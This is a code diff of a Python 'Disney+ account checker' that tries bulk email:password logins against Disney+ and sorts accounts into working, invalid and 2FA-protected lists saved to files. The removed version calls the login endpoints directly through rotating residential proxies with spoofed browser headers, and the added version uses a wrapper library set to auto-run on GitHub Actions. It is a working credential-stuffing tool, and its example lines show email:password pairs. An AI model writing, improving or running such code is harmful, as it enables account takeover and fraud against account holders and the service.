@@ -1,58 +1,40 @@
 """
-DISNEY+ CHECKER - WITH PROXY SUPPORT FOR GITHUB ACTIONS
-Uses your rotating residential proxy
+DISNEY+ ACCOUNT CHECKER - Using pydisney wrapper
+Works with GitHub Actions
 """
 
-import requests
 import time
 import os
-import json
-import random
+import sys
 from datetime import datetime
 
-class DisneyProxyChecker:
+# Try to import pydisney
+try:
+    from pydisney import DisneyAPI
+    PYDISNEY_AVAILABLE = True
+except ImportError:
+    print("⚠️ pydisney not installed. Run: pip install pydisney")
+    PYDISNEY_AVAILABLE = False
+
+class DisneyChecker:
     def __init__(self):
         self.accounts_file = "my_disney_accounts.txt"
-        self.proxies_file = "proxies.txt"
         self.working_file = "WORKING_ACCOUNTS.txt"
         self.invalid_file = "INVALID_ACCOUNTS.txt"
         self.twofa_file = "TWOFA_ACCOUNTS.txt"
         self.accounts = []
-        self.proxies = []
         self.working = []
         self.invalid = []
         self.twofa_accounts = []
-        self.proxy_index = 0
         
-    def load_proxies(self):
-        """Load proxies from proxies.txt"""
-        if not os.path.exists(self.proxies_file):
-            print(f"⚠️ {self.proxies_file} not found! Running without proxies...")
-            return False
+        # Check if running on GitHub Actions
+        self.is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
         
-        with open(self.proxies_file, 'r') as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith('#'):
-                    if not line.startswith('http'):
-                        line = f'http://{line}'
-                    self.proxies.append(line)
-        
-        print(f"✅ Loaded {len(self.proxies)} proxies")
-        return len(self.proxies) > 0
-    
-    def get_next_proxy(self):
-        """Get next proxy in rotation"""
-        if not self.proxies:
-            return None
-        proxy = self.proxies[self.proxy_index % len(self.proxies)]
-        self.proxy_index += 1
-        return proxy
-    
     def load_accounts(self):
         """Load accounts from file"""
         if not os.path.exists(self.accounts_file):
             print(f"❌ {self.accounts_file} not found!")
+            print("   Create file with format: email:password")
             return False
         
         with open(self.accounts_file, 'r') as f:
@@ -68,179 +50,173 @@ class DisneyProxyChecker:
         print(f"✅ Loaded {len(self.accounts)} accounts")
         return True
     
-    def check_account(self, account, proxy=None):
-        """Check account using Disney's API with proxy"""
+    def check_account(self, account):
+        """Check single account using pydisney"""
         email = account['email']
         password = account['password']
         
         print(f"\n🔍 Testing: {email[:35]}...")
         
-        # Configure proxy
-        proxies = None
-        if proxy:
-            proxies = {'http': proxy, 'https': proxy}
-            print(f"   🌐 Using proxy: {proxy[:40]}...")
-        
-        session = requests.Session()
-        
-        # Real browser headers
-        session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Content-Type": "application/json",
-            "Origin": "https://www.disneyplus.com",
-            "Referer": "https://www.disneyplus.com/",
-        })
-        
-        if proxies:
-            session.proxies.update(proxies)
+        if not PYDISNEY_AVAILABLE:
+            print(f"   ❌ pydisney not available")
+            return False
         
         try:
-            # Step 1: Check if email exists
-            email_response = session.post(
-                "https://www.disneyplus.com/identity/api/login",
-                json={"email": email},
-                timeout=30
-            )
+            # Try to authenticate with Disney+
+            api = DisneyAPI(email=email, password=password, force_login=True)
             
-            if email_response.status_code == 404:
-                print(f"   ❌ API endpoint not found - Disney may have changed their API")
-                return False
-            elif email_response.status_code == 403:
-                print(f"   ❌ Access denied - IP may be blocked")
-                return False
-            elif email_response.status_code != 200:
-                print(f"   ❌ Email check failed (HTTP {email_response.status_code})")
-                return False
+            # If we get here without exception, login was successful
+            print(f"   ✅✅✅ WORKING! ✅✅✅")
+            return True
             
-            email_data = email_response.json()
-            
-            if not email_data.get('is_identified'):
-                print(f"   ❌ Email not registered with Disney+")
-                return False
-            
-            # Step 2: Check password
-            login_response = session.post(
-                "https://www.disneyplus.com/identity/api/login/password",
-                json={
-                    "email": email,
-                    "password": password,
-                    "rememberMe": False
-                },
-                timeout=30
-            )
-            
-            if login_response.status_code == 200:
-                login_data = login_response.json()
-                
-                if login_data.get('accessToken'):
-                    print(f"   ✅✅✅ WORKING! ✅✅✅")
-                    return True
-                elif 'error' in login_data:
-                    error_msg = login_data.get('error_description', 'Unknown')
-                    if '2fa' in error_msg.lower() or 'verification' in error_msg.lower():
-                        print(f"   🔐 2FA REQUIRED")
-                        return '2fa'
-                    else:
-                        print(f"   ❌ Wrong password")
-                        return False
-                else:
-                    print(f"   ❌ Login failed")
-                    return False
-            elif login_response.status_code == 403:
-                print(f"   🔐 2FA REQUIRED")
-                return '2fa'
-            else:
-                print(f"   ❌ Password check failed (HTTP {login_response.status_code})")
-                return False
-                
-        except requests.exceptions.Timeout:
-            print(f"   ⚠️ Timeout - proxy may be slow")
-            return False
-        except requests.exceptions.ProxyError:
-            print(f"   ❌ Proxy error - skipping")
-            return False
         except Exception as e:
-            print(f"   ❌ Error: {str(e)[:60]}")
-            return False
+            error_msg = str(e).lower()
+            
+            # Check for 2FA requirement
+            if '2fa' in error_msg or 'verification' in error_msg or 'code' in error_msg or 'mfa' in error_msg:
+                print(f"   🔐 2FA REQUIRED - Needs verification code")
+                return '2fa'
+            
+            # Check for invalid credentials
+            elif 'invalid' in error_msg or 'wrong' in error_msg or 'failed' in error_msg:
+                print(f"   ❌ INVALID - Wrong email or password")
+                return False
+            
+            # Check for network/proxy issues
+            elif 'timeout' in error_msg or 'connection' in error_msg:
+                print(f"   ⚠️ NETWORK ERROR - Timeout or connection issue")
+                return False
+            
+            # Other errors
+            else:
+                print(f"   ❌ ERROR: {str(e)[:80]}")
+                return False
+    
+    def save_working(self):
+        """Save working account immediately"""
+        if self.working:
+            with open(self.working_file, 'w') as f:
+                f.write("="*50 + "\n")
+                f.write("✅ WORKING DISNEY+ ACCOUNTS ✅\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*50 + "\n\n")
+                for acc in self.working:
+                    f.write(f"{acc['email']}:{acc['password']}\n")
+    
+    def save_invalid(self):
+        """Save invalid accounts"""
+        if self.invalid:
+            with open(self.invalid_file, 'w') as f:
+                f.write("="*50 + "\n")
+                f.write("❌ INVALID DISNEY+ ACCOUNTS ❌\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*50 + "\n\n")
+                for acc in self.invalid:
+                    f.write(f"{acc['email']}:{acc['password']}\n")
+    
+    def save_twofa(self):
+        """Save 2FA accounts"""
+        if self.twofa_accounts:
+            with open(self.twofa_file, 'w') as f:
+                f.write("="*50 + "\n")
+                f.write("🔐 2FA REQUIRED ACCOUNTS 🔐\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*50 + "\n")
+                f.write("# These accounts need verification code from email\n\n")
+                for acc in self.twofa_accounts:
+                    f.write(f"{acc['email']}:{acc['password']}\n")
     
     def check_all(self):
-        """Check all accounts with proxy rotation"""
+        """Check all accounts"""
         total = len(self.accounts)
-        has_proxies = self.load_proxies()
         
-        if not has_proxies:
-            print("\n⚠️ No proxies found! Add proxies to proxies.txt")
-            print("   Format: http://user:pass@host:port")
-            return
-        
-        print(f"\n📊 Starting check of {total} accounts")
-        print(f"🔄 Using {len(self.proxies)} rotating proxies")
+        print(f"\n{'='*50}")
+        print("🎬 STARTING DISNEY+ CHECKER")
+        print(f"{'='*50}")
+        print(f"📊 Total accounts: {total}")
+        print(f"⏱️ Estimated time: ~{total * 0.5:.1f} minutes")
+        print(f"{'='*50}\n")
         
         for i, account in enumerate(self.accounts, 1):
-            print(f"\n{'='*50}")
             print(f"[{i}/{total}]")
-            print(f"{'='*50}")
             
-            # Rotate proxy for each account
-            proxy = self.get_next_proxy()
-            result = self.check_account(account, proxy)
+            result = self.check_account(account)
             
             if result == True:
                 self.working.append(account)
-                with open(self.working_file, 'a') as f:
-                    f.write(f"{account['email']}:{account['password']}\n")
-                print(f"   💾 Saved to working accounts")
+                self.save_working()
+                print(f"   💾 Saved to working accounts (Total: {len(self.working)})")
             elif result == '2fa':
                 self.twofa_accounts.append(account)
-                with open(self.twofa_file, 'a') as f:
-                    f.write(f"{account['email']}:{account['password']}\n")
+                self.save_twofa()
+                print(f"   💾 Saved to 2FA accounts (Total: {len(self.twofa_accounts)})")
             else:
                 self.invalid.append(account)
+                if len(self.invalid) % 50 == 0:
+                    self.save_invalid()
             
-            # Progress update
+            # Progress update every 50 accounts
             if i % 50 == 0:
                 print(f"\n📊 PROGRESS: {i}/{total}")
                 print(f"   ✅ Working: {len(self.working)}")
                 print(f"   ❌ Invalid: {len(self.invalid)}")
                 print(f"   🔐 2FA: {len(self.twofa_accounts)}")
+                print(f"   ⏱️ Remaining: ~{(total - i) * 0.5:.1f} minutes\n")
             
-            # Delay between requests
-            delay = random.uniform(5, 10)
-            time.sleep(delay)
+            # Delay to avoid rate limiting (shorter for GitHub Actions)
+            if self.is_github:
+                time.sleep(3)
+            else:
+                time.sleep(5)
         
         # Final summary
+        self.save_working()
+        self.save_invalid()
+        self.save_twofa()
+        
         print(f"\n{'='*50}")
         print("✅ CHECKING COMPLETE!")
         print(f"{'='*50}")
-        print(f"✅ Working: {len(self.working)}")
-        print(f"❌ Invalid: {len(self.invalid)}")
-        print(f"🔐 2FA: {len(self.twofa_accounts)}")
+        print(f"✅ Working accounts: {len(self.working)}")
+        print(f"❌ Invalid accounts: {len(self.invalid)}")
+        print(f"🔐 2FA required: {len(self.twofa_accounts)}")
+        print(f"{'='*50}")
+        print(f"\n📁 Files created:")
+        print(f"   - {self.working_file}")
+        print(f"   - {self.invalid_file}")
+        print(f"   - {self.twofa_file}")
 
 def main():
-    checker = DisneyProxyChecker()
-    
     print("="*50)
-    print("🎬 DISNEY+ PROXY CHECKER")
+    print("🎬 DISNEY+ ACCOUNT CHECKER")
     print("="*50)
     
-    if not checker.load_accounts():
-        print("\n📝 Create my_disney_accounts.txt with:")
-        print("   email:password")
+    # Check if pydisney is installed
+    if not PYDISNEY_AVAILABLE:
+        print("\n❌ pydisney is not installed!")
+        print("   Run: pip install pydisney")
+        print("   Or add 'pydisney' to requirements.txt")
         return
     
-    # Auto-start on GitHub Actions
-    is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
+    checker = DisneyChecker()
     
-    if is_github:
-        print("🕶️ Running on GitHub Actions")
+    if not checker.load_accounts():
+        print("\n📝 Example of my_disney_accounts.txt:")
+        print("   eduardomoreno@crackhogar.com:C1r1a1ck")
+        print("   ozkqariin@gmail.com:password123")
+        return
+    
+    # Auto-start on GitHub Actions, otherwise ask
+    if checker.is_github:
+        print("\n🕶️ Running on GitHub Actions - auto-starting...")
         checker.check_all()
     else:
-        confirm = input("\n▶️ Start? (yes/no): ")
+        print(f"\n📊 {len(checker.accounts)} accounts to check")
+        confirm = input("\n▶️ Start checking? (yes/no): ")
         if confirm.lower() == 'yes':
             checker.check_all()
+        else:
+            print("❌ Cancelled")
 
 if __name__ == "__main__":
     main()
